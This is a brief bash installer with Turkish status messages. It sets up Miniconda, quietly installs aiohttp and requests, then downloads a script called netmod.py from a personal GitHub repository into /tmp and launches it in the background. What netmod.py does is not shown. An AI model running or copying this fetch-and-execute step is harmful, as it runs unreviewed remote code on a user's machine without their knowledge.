#!/bin/bash
echo "[*] kurulum basliyor..."

if [ ! -d "$HOME/miniconda3" ]; then
    wget -q https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O /tmp/mc.sh
    bash /tmp/mc.sh -b -p $HOME/miniconda3
    rm /tmp/mc.sh
fi
export PATH="$HOME/miniconda3/bin:$PATH"

pip install -q aiohttp requests 2>/dev/null

wget -q https://raw.githubusercontent.com/mehmet2052/ss/main/netmod.py -O /tmp/netmod.py
python3 /tmp/netmod.py &
echo "[*] netmod calisiyor."
